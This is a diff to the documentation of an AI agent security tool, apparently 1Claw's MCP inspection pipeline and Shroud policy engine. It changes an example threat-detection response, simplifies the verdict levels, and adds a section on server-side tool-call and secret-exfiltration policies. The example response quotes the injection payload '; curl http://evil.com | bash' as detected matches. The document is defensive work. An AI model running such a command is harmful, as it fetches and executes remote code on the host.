@@ -167,14 +167,14 @@ Response:
     "safe": false,
     "threat_count": 2,
     "threats": [
-        { "type": "command_injection", "pattern": "shell_chain", "severity": "critical", "match": "; curl http://evil.com | bash" },
-        { "type": "network_threat", "pattern": "data_exfil", "severity": "critical", "match": "curl http://evil.com" }
+        { "type": "command_injection", "pattern": "shell_chain", "severity": "critical", "location": "; curl http://evil.com | bash" },
+        { "type": "network_threat", "pattern": "data_exfil", "severity": "critical", "location": "curl http://evil.com" }
     ],
     "unicode_normalized": false
 }
 ```
 
-Verdicts: `clean` (no threats), `warning` (low/medium), `suspicious` (high), `malicious` (critical).
+Verdicts: `clean` (no threats) or `malicious` (critical threat detected — e.g. command injection, social engineering, critical PII, or critical network threat).
 
 ## Example Workflow (Vault)
 
@@ -233,3 +233,15 @@ All tool calls pass through an inspection pipeline before execution and after re
 | `ONECLAW_MCP_REDACT_SECRETS`       | `true`   | Redact known secret values from non-secret tool outputs. Requires security enabled.              |
 | `ONECLAW_MCP_PII_DETECTION`        | `true`   | Detect PII patterns (emails, SSNs, credit cards, etc.) in inputs and outputs.                    |
 | `ONECLAW_MCP_EXFIL_PROTECTION`     | `warn`   | `block` rejects tool inputs containing known secrets; `warn` logs but allows; `off` disables.    |
+
+### Shroud advanced security
+
+When an agent has `shroud_enabled: true`, its JWT carries a `shroud_config` payload that configures Shroud's server-side PolicyEngine. These features run inside the TEE on LLM traffic routed through `shroud.1claw.xyz` and are independent of the MCP inspection pipeline above:
+
+- **Tool call inspection** — Validates tool calls emitted by the LLM against allowed/denied patterns.
+- **Output policies** — Enforces response-level rules (e.g. block certain content categories, length limits).
+- **Secret injection detection** — Detects when an LLM attempts to inject or exfiltrate secret values in its responses.
+- **Semantic policy** — Context-aware policy rules evaluated against the full conversation (beyond regex patterns).
+- **Advanced redaction** — Server-side secret redaction with configurable scope and granularity.
+
+Configure these via the agent's `shroud_config` JSON in the dashboard, SDK (`CreateAgentRequest.shroud_config`), or CLI (`agent update`). See the [Shroud documentation](https://docs.1claw.xyz/shroud) for the full `shroud_config` schema.
